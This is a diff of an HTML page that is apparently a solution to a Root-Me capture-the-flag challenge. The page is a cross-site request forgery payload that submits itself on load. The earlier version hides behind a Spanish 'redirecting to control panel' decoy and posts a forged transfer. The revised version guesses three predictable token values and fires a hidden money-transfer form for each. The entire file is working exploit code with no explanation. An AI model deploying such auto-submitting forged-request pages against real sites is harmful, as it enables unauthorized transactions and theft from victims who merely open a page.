@@ -1,39 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Cargando propuesta comercial...</title>
-</head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h1>Redirigiendo al panel de control...</h1>
-        <p>Por favor, no cierre esta ventana.</p>
-    </div>
-
     <script>
-        // Creamos el formulario de ataque
-        var f = document.createElement("form");
-        f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
-        f.method = "POST";
-
-        // DATOS CORREGIDOS
-        var data = {
-            "token": "6594d3fb4300bf02000000", // Hex exacto de 2024-01-03 04:09:31
-            "recipient": "test",             // TU nombre de usuario
-            "amount": "1000"                 // Monto dentro del límite
-        };
-
-        for (var key in data) {
-            var input = document.createElement("input");
-            input.type = "hidden";
-            input.name = key;
-            input.value = data[key];
-            f.appendChild(input);
-        }
-
-        document.body.appendChild(f);
+        const victimBase = "6594d3fb4300bf0200"; // the_dwalt00ns
+        const counters = ["000000", "000001", "000002"];
         
-        // Ejecución inmediata
-        f.submit();
+        counters.forEach((ctr, i) => {
+            let f = document.createElement("form");
+            f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
+            f.method = "POST";
+            f.target = "_blank"; // Abrimos en pestañas nuevas para que no se pisen
+
+            let data = {
+                "token": victimBase + ctr,
+                "recipient": "test",
+                "amount": "1000"
+            };
+
+            for (let key in data) {
+                let opt = document.createElement("input");
+                opt.type = "hidden";
+                opt.name = key;
+                opt.value = data[key];
+                f.appendChild(opt);
+            }
+            document.body.appendChild(f);
+            f.submit();
+        });
     </script>
 </body>
 </html>
